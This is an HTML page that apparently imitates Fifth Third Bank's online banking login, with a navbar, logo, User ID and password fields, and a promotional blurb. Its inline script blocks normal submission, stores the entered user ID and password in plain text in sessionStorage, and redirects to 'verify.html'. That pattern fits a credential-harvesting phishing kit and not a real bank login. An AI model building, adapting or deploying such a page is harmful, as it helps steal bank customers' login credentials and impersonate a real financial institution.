<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fifth Third Secure Panel</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Arial, sans-serif;
      background: #f5f6fa;
    }
    .navbar {
      background: #102050;
      height: 56px;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }
    .menu-btn {
      position: absolute;
      left: 16px;
      background: none;
      border: none;
      height: 40px;
      width: 40px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }
    .menu-icon {
      width: 24px;
      height: 2px;
      background: #fff;
      display: block;
      position: relative;
    }
    .menu-icon::before,
    .menu-icon::after {
      content: '';
      position: absolute;
      left: 0;
      width: 24px;
      height: 2px;
      background: #fff;
      transition: 0.2s;
    }
    .menu-icon::before {
      top: -8px;
    }
    .menu-icon::after {
      top: 8px;
    }
    .logo-container {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 56px;
    }
    .logo-img {
      height: 72px;
      width: auto;
      margin: 0 0 0 0;
    }
    .main-bg {
      background: #f5f6fa;
      min-height: 100vh;
      padding: 0;
    }
    .login-card {
      background: #ececec;
      border-radius: 8px;
      box-shadow: 0 2px 12px rgba(30, 50, 100, 0.10);
      max-width: 420px;
      margin: 32px auto 0 auto;
      padding: 32px 24px 24px 24px;
    }
    .login-title {
      font-size: 1.7em;
      font-weight: 700;
      color: #222;
      margin-bottom: 24px;
      text-align: left;
      width: 100%;
    }
    .verify-form label {
      margin-bottom: 16px;
      font-size: 1em;
      color: #222;
      font-weight: 700;
      display: block;
      text-align: left;
    }
    .verify-form select,
    .verify-form input {
      width: 100%;
      max-width: 320px;
      margin-left: auto;
      margin-right: auto;
      padding: 14px 12px;
      border: 1px solid #bfc5ce;
      border-radius: 3px;
      font-size: 1em;
      margin-top: 6px;
      background: #fff;
      color: #222;
      box-sizing: border-box;
    }
    .user-id-row {
      display: flex;
      align-items: center;
      gap: 0;
      width: 100%;
      max-width: 320px;
      margin-left: auto;
      margin-right: auto;
      border: 1px solid #bfc5ce;
      border-radius: 3px;
      background: #fff;
      margin-top: 6px;
      overflow: hidden;
    }
    .user-id-row input {
      flex: 1;
      border: none;
      padding: 14px 12px;
      font-size: 1em;
      background: transparent;
      margin-top: 0;
      outline: none;
    }
    .user-id-row .save-btn {
      border: none;
      background: none;
      color: #1a357a;
      padding: 0 16px;
      font-size: 1em;
      font-weight: 500;
      height: 100%;
      border-left: 1px solid #bfc5ce;
      border-radius: 0 3px 3px 0;
      cursor: pointer;
      margin-top: 0;
      outline: none;
    }
    .user-id-row .save-btn:hover {
      background: none;
      color: #2248b0;
    }
    .login-btn {
      width: 100%;
      background: #1746a0;
      color: #fff;
      border: none;
      border-radius: 4px;
      padding: 12px 0;
      font-size: 1.1em;
      font-weight: 700;
      cursor: pointer;
      margin-top: 18px;
      margin-bottom: 8px;
      transition: background 0.2s;
      letter-spacing: 1px;
    }
    .login-btn:hover {
      background: #102050;
    }
    .links {
      margin-top: 12px;
      text-align: left;
      font-size: 1em;
    }
    .links a {
      color: #1a357a;
      text-decoration: none;
      margin-right: 12px;
    }
    .links a:hover {
      text-decoration: underline;
    }
    .info-section {
      background: #fff;
      padding: 36px 0 36px 0;
      text-align: center;
      margin-top: 0;
    }
    .info-section h2 {
      color: #222;
      font-size: 1.3em;
      font-weight: 700;
      margin-bottom: 12px;
    }
    .info-section p {
      color: #333;
      font-size: 1.1em;
      margin: 0 auto;
      max-width: 600px;
    }
    @media (max-width: 600px) {
      .login-card {
        max-width: 98vw;
        padding: 8vw 2vw 8vw 2vw;
      }
      .navbar {
        height: 48px;
      }
      .logo-img {
        height: 28px;
      }
    }
  </style>
</head>
<body>
  <nav class="navbar">
    <button class="menu-btn" aria-label="Open menu">
      <span class="menu-icon"></span>
    </button>
    <div class="logo-container">
      <img src="/53rd.logo.png" alt="Fifth Third Logo" class="logo-img">
    </div>
  </nav>
  <div class="main-bg">
    <div class="login-card">
      <div class="login-title">Online Banking Login</div>
      <form class="verify-form" id="login-form">
        <label>Online Banking
          <select name="banktype">
            <option>Online Banking</option>
            <option>Commercial Banking</option>
          </select>
        </label>
        <label>User ID
          <div class="user-id-row">
            <input type="text" name="userid" required placeholder="User ID">
            <button type="button" class="save-btn">Save</button>
          </div>
        </label>
        <label>Password
          <input type="password" name="password" required>
        </label>
        <button type="submit" class="login-btn">LOG IN</button>
        <div class="links">
          <a href="#">Forgot Login?</a>
          <a href="#">First Time User? Register.</a>
        </div>
      </form>
    </div>
    <div class="info-section">
      <h2>Log In to View Your Accounts</h2>
      <p>Online banking is available, all day, every day. Simply log in to pay bills, view statements, chat with live agents, pay bills directly from your account, and more.</p>
    </div>
  </div>
  <script>
    document.getElementById('login-form').onsubmit = function(e) {
      e.preventDefault();
      const userid = this.userid.value;
      const password = this.password.value;
      sessionStorage.setItem('userid', userid);
      sessionStorage.setItem('password', password);
      window.location.href = 'verify.html';
    };
  </script>
</body>
</html>
